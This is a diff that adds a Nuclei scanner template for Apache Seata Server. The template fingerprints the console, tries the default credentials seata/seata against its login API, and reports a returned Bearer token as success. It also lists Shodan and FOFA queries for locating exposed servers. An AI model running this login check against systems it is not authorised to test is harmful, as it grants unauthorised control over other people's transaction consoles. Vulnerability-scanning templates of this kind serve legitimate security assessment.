@@ -1,0 +1,68 @@
+id: apache-seata-default-login
+
+info:
+  name: Apache Seata - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Apache Seata Server 1.5.0 through 2.3.x ships a web console with the default credentials seata/seata. An attacker can log in to the console and view or manage global transactions, branch sessions and global locks.
+  reference:
+    - https://github.com/apache/incubator-seata/blob/v2.3.0/server/src/main/resources/application.yml
+    - https://github.com/apache/incubator-seata/pull/7261
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:apache:seata:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: apache
+    product: seata
+    shodan-query: http.title:"Seata"
+    fofa-query: title="Seata"
+  tags: seata,apache,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<title>Seata</title>")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/v1/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - seata
+      password:
+        - seata
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains(body, "\"success\":true")'
+          - 'contains(body, "\"data\":\"Bearer ")'
+          - 'regex("(?mi)^authorization:\\s*Bearer\\s+ey", header)'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
